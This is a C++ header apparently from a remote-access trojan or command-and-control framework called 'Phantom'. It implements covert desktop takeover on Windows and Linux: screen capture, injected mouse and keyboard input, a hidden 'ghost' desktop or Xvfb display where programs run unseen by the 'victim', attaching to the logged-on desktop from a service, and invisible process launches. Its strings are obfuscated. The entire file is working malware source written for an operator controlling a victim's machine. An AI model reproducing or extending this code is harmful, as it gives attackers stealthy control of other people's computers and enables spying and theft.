#pragma once
// ============================================================================
//  remote_session.h — Phantom Remote Session Module: screen + input.
//
//  Full GUI takeover primitives for the remote module. Three modes, chosen
//  at runtime by the operator (`remote mode <mode>`):
//
//    interactive  — the ACTIVE desktop: capture + SendInput. The victim
//                   SEES the cursor move (classic VNC behavior). Use when
//                   the operator must act on the real desktop.
//    ghost        — a HIDDEN virtual desktop (CreateDesktop / Xvfb). Apps
//                   launched there run invisibly and input injected there
//                   never reaches the victim's screen. The truly stealth
//                   mode: full control, nothing visible.
//    steal        — attach to the interactive input desktop (OpenInputDesktop)
//                   even when running from a service context; capture the
//                   real logged-on desktop. Same visibility as interactive,
//                   but works from a non-interactive session.
//
//  Frames are JPEG-encoded (Windows: GDI+ via the beacon's jpeg_enc.h;
//  Linux: external import/xwd, PNG passthrough — the server sniffs format).
// ============================================================================

#include <string>
#include <vector>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <sstream>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <wtsapi32.h>
    #pragma comment(lib, "user32.lib")
    #pragma comment(lib, "gdi32.lib")
    #pragma comment(lib, "wtsapi32.lib")
    #include "jpeg_enc.h"
#include "remote_obf.h"
#else
    #include <unistd.h>
    #include <sys/wait.h>
#endif

namespace remote_session {

enum class Mode { INTERACTIVE, GHOST, STEAL };

#ifdef _WIN32
static HDESK g_hidden_desktop = nullptr;
static Mode  g_mode = Mode::INTERACTIVE;

static std::string _mode_name() {
    switch (g_mode) {
        case Mode::GHOST: return "ghost (hidden virtual desktop)";
        case Mode::STEAL: return "steal (interactive input desktop)";
        default:          return "interactive (active desktop)";
    }
}

static HDESK _target_desktop() {
    if (g_mode == Mode::GHOST) {
        if (!g_hidden_desktop) {
            g_hidden_desktop = CreateDesktopA("PhantomGhost_Desktop", nullptr, nullptr,
                                              0, GENERIC_ALL, nullptr);
        }
        return g_hidden_desktop;
    }
    if (g_mode == Mode::STEAL) {
        return OpenInputDesktop(0, FALSE, GENERIC_ALL);
    }
    return nullptr; // interactive: whatever the thread is on
}

// Capture the target desktop to a JPEG/PNG byte vector. Returns false on
// failure. The thread is temporarily switched to the target desktop (ghost
// desktops are not visible on GetDC(NULL)).
static bool capture_frame(std::vector<unsigned char>& out, int quality) {
    HDESK target = _target_desktop();
    HDESK old = GetThreadDesktop(GetCurrentThreadId());
    if (target && old != target) {
        if (!SetThreadDesktop(target)) return false;
    }
    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) return false;
    int w = GetDeviceCaps(hScreenDC, HORZRES);
    int h = GetDeviceCaps(hScreenDC, VERTRES);
    HDC hMemDC = CreateCompatibleDC(hScreenDC);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreenDC, w, h);
    if (!hMemDC || !hBmp) {
        if (hMemDC) DeleteDC(hMemDC);
        ReleaseDC(nullptr, hScreenDC);
        return false;
    }
    HGDIOBJ hOld = SelectObject(hMemDC, hBmp);
    BitBlt(hMemDC, 0, 0, w, h, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemDC, hOld);
    DeleteDC(hMemDC);
    ReleaseDC(nullptr, hScreenDC);

    bool ok = jpegenc::encode_hbitmap(hBmp, (ULONG)quality, out);
    DeleteObject(hBmp);
    return ok;
}

// Apply an input event on the target desktop. NOT an operator command —
// this is the internal primitive the operator-facing UI (Electron canvas /
// C2 shell live view) calls for each translated mouse/keyboard event:
// the operator acts on the streamed view, the UI forwards the event here.
// Exposed in-band only for automation, never shown in beacon help.
static std::string inject_input(const std::string& args) {
    HDESK target = _target_desktop();
    HDESK old = GetThreadDesktop(GetCurrentThreadId());
    if (target && old != target) {
        if (!SetThreadDesktop(target)) return "ERROR: cannot attach to target desktop";
    }
    std::istringstream iss(args);
    std::string type;
    iss >> type;
    if (type == "move") {
        int x = 0, y = 0;
        if (!(iss >> x >> y)) return R_S("Usage: remote input move <x> <y>");
        SetCursorPos(x, y);
        return "moved to " + std::to_string(x) + "," + std::to_string(y);
    }
    if (type == "click") {
        int x = -1, y = -1;
        iss >> x >> y;
        if (x >= 0 && y >= 0) SetCursorPos(x, y);
        INPUT in{};
        in.type = INPUT_MOUSE;
        in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
        SendInput(1, &in, sizeof(INPUT));
        in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
        SendInput(1, &in, sizeof(INPUT));
        return "clicked";
    }
    if (type == "scroll") {
        int dx = 0, dy = 0;
        if (!(iss >> dx >> dy)) return R_S("Usage: remote input scroll <dx> <dy>");
        INPUT in{};
        in.type = INPUT_MOUSE;
        in.mi.dwFlags = MOUSEEVENTF_WHEEL;
        in.mi.mouseData = (DWORD)dy * 120;
        SendInput(1, &in, sizeof(INPUT));
        return "scrolled";
    }
    if (type == "key") {
        std::string name;
        iss >> name;
        if (name.empty()) return R_S("Usage: remote input key <name|VK> (e.g. ENTER, TAB, 0x41)");
        WORD vk = 0;
        if (name.size() > 2 && name.substr(0, 2) == "0x") {
            vk = (WORD)strtoul(name.c_str(), nullptr, 16);
        } else if (name.size() == 1) {
            vk = (WORD)toupper(name[0]);
        } else if (name == "ENTER" || name == "RETURN") vk = VK_RETURN;
        else if (name == "TAB") vk = VK_TAB;
        else if (name == "ESC" || name == "ESCAPE") vk = VK_ESCAPE;
        else if (name == "SPACE") vk = VK_SPACE;
        else if (name == "BACK") vk = VK_BACK;
        else if (name == "DEL" || name == "DELETE") vk = VK_DELETE;
        else if (name == "UP") vk = VK_UP;
        else if (name == "DOWN") vk = VK_DOWN;
        else if (name == "LEFT") vk = VK_LEFT;
        else if (name == "RIGHT") vk = VK_RIGHT;
        else if (name == "WIN") vk = VK_LWIN;
        else if (name == "F5") vk = VK_F5;
        if (!vk) return "Unknown key: " + name;
        INPUT in{};
        in.type = INPUT_KEYBOARD;
        in.ki.wVk = vk;
        SendInput(1, &in, sizeof(INPUT));
        in.ki.dwFlags = KEYEVENTF_KEYUP;
        SendInput(1, &in, sizeof(INPUT));
        return "key pressed";
    }
    if (type == "type") {
        std::string text;
        std::getline(iss >> std::ws, text);
        if (text.empty()) return R_S("Usage: remote input type <text>");
        for (char c : text) {
            SHORT vk = VkKeyScanA(c);
            if (vk == -1) continue;
            INPUT in{};
            in.type = INPUT_KEYBOARD;
            in.ki.wVk = (WORD)(vk & 0xFF);
            if (vk & 0x100) {
                INPUT shift{};
                shift.type = INPUT_KEYBOARD;
                shift.ki.wVk = VK_SHIFT;
                SendInput(1, &shift, sizeof(INPUT));
                SendInput(1, &in, sizeof(INPUT));
                in.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1, &in, sizeof(INPUT));
                shift.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1, &shift, sizeof(INPUT));
            } else {
                SendInput(1, &in, sizeof(INPUT));
                in.ki.dwFlags = KEYEVENTF_KEYUP;
                SendInput(1, &in, sizeof(INPUT));
            }
        }
        return "typed " + std::to_string(text.size()) + " chars";
    }
    return R_S("Usage: remote input <move|click|scroll|key|type> ...");
}

// Launch a process on the target desktop (ghost → invisible to the victim).
static std::string launch(const std::string& cmdline) {
    if (cmdline.empty()) return "Usage: remote launch <command> [args]";
    std::string desktop = "";
    HDESK target = _target_desktop();
    if (target) {
        char name[256] = {0};
        DWORD len = 0;
        GetUserObjectInformationA(target, UOI_NAME, name, sizeof(name), &len);
        desktop = name;
    }
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    if (!desktop.empty()) si.lpDesktop = const_cast<char*>(desktop.c_str());
    PROCESS_INFORMATION pi{};
    std::string cmd = cmdline;
    BOOL ok = CreateProcessA(nullptr, &cmd[0], nullptr, nullptr, FALSE,
                             CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,
                             nullptr, nullptr, &si, &pi);
    if (!ok) return "ERROR: CreateProcess failed (" + std::to_string(GetLastError()) + ")";
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return "launched pid " + std::to_string(pi.dwProcessId) + " on desktop '" +
           (desktop.empty() ? "current" : desktop) + "'";
}

static std::string set_mode(const std::string& name) {
    std::string m;
    for (char c : name) m += (char)tolower(c);
    if (m == "interactive") g_mode = Mode::INTERACTIVE;
    else if (m == "ghost")  g_mode = Mode::GHOST;
    else if (m == "steal")  g_mode = Mode::STEAL;
    else return "Usage: remote mode <interactive|ghost|steal>";
    return "mode set to " + _mode_name();
}

#else // ── POSIX (Linux/macOS): X11 + external tools ────────────────────────

static std::string g_display = "";   // empty = default (:0)
static Mode g_mode = Mode::INTERACTIVE;

static std::string _mode_name() {
    switch (g_mode) {
        case Mode::GHOST: return "ghost (Xvfb hidden display" + (g_display.empty() ? std::string("") : " " + g_display) + ")";
        case Mode::STEAL: return "steal (attaches to interactive display)";
        default:          return "interactive (active display)";
    }
}

static std::string _run(const std::string& cmd) {
    FILE* f = popen((cmd + " 2>/dev/null").c_str(), "r");
    if (!f) return "";
    std::string out;
    char buf[4096];
    int n;
    while ((n = (int)fread(buf, 1, sizeof(buf), f)) > 0) out.append(buf, (size_t)n);
    pclose(f);
    return out;
}

// Capture the target display as PNG/JPEG bytes (import / xwd+convert).
static bool capture_frame(std::vector<unsigned char>& out, int /*quality*/) {
    std::string dis = g_display.empty() ? "" : " -display " + g_display;
    std::string cmd = "import -window root -silent" + dis + " PNG:- 2>/dev/null";
    FILE* f = popen(cmd.c_str(), "re");
    if (!f) return false;
    char buf[16384];
    int n;
    while ((n = (int)fread(buf, 1, sizeof(buf), f)) > 0)
        out.insert(out.end(), buf, buf + n);
    int ret = pclose(f);
    if (ret != 0 || out.empty()) {
        out.clear();
        cmd = "xwd -root -silent" + dis + " 2>/dev/null | convert xwd:- PNG:- 2>/dev/null";
        f = popen(cmd.c_str(), "re");
        if (!f) return false;
        while ((n = (int)fread(buf, 1, sizeof(buf), f)) > 0)
            out.insert(out.end(), buf, buf + n);
        pclose(f);
    }
    return !out.empty();
}

// Apply an input event on the target display (POSIX build). Internal
// primitive for the operator-facing UI (see the Windows build's note).
static std::string inject_input(const std::string& args) {
    std::string dis = g_display.empty() ? "" : " --display " + g_display;
    std::istringstream iss(args);
    std::string type;
    iss >> type;
    if (type == "move") {
        int x = 0, y = 0;
        if (!(iss >> x >> y)) return R_S("Usage: remote input move <x> <y>");
        _run("xdotool" + dis + " mousemove " + std::to_string(x) + " " + std::to_string(y));
        return "moved to " + std::to_string(x) + "," + std::to_string(y);
    }
    if (type == "click") {
        int x = -1, y = -1;
        iss >> x >> y;
        std::string cmd = "xdotool" + dis;
        if (x >= 0 && y >= 0) cmd += " mousemove " + std::to_string(x) + " " + std::to_string(y) + " &&";
        cmd += " click 1";
        _run(cmd);
        return "clicked";
    }
    if (type == "scroll") {
        int dy = 0;
        if (!(iss >> dy)) return R_S("Usage: remote input scroll <dy>");
        _run("xdotool" + dis + " click " + std::string(dy > 0 ? "4" : "5"));
        return "scrolled";
    }
    if (type == "key") {
        std::string name;
        iss >> name;
        if (name.empty()) return R_S("Usage: remote input key <name>");
        _run("xdotool" + dis + " key " + name);
        return "key pressed";
    }
    if (type == "type") {
        std::string text;
        std::getline(iss >> std::ws, text);
        if (text.empty()) return R_S("Usage: remote input type <text>");
        _run("xdotool" + dis + " type -- " + text);
        return "typed " + std::to_string(text.size()) + " chars";
    }
    return R_S("Usage: remote input <move|click|scroll|key|type> ...");
}

static std::string launch(const std::string& cmdline) {
    if (cmdline.empty()) return "Usage: remote launch <command> [args]";
    std::string dis = g_display.empty() ? "" : "DISPLAY=" + g_display + " ";
    std::string cmd = "nohup " + dis + cmdline + " >/dev/null 2>&1 &";
    _run(cmd);
    return "launched: " + cmdline + (_mode_name().find("ghost") != std::string::npos ? " (hidden display)" : "");
}

static std::string set_mode(const std::string& name) {
    std::string m;
    for (char c : name) m += (char)tolower(c);
    if (m == "interactive") g_mode = Mode::INTERACTIVE;
    else if (m == "ghost") {
        g_mode = Mode::GHOST;
        // try to spin up a private Xvfb display (no window manager required)
        _run("pgrep -f 'Xvfb :99' >/dev/null || (Xvfb :99 -screen 0 1920x1080x24 >/dev/null 2>&1 &)");
        g_display = ":99";
    } else if (m == "steal") {
        g_mode = Mode::STEAL;
        g_display = ""; // interactive display
    } else return "Usage: remote mode <interactive|ghost|steal>";
    return "mode set to " + _mode_name();
}

#endif

// ── Shared ─────────────────────────────────────────────────────────────────

static std::string mode_name() { return _mode_name(); }

} // namespace remote_session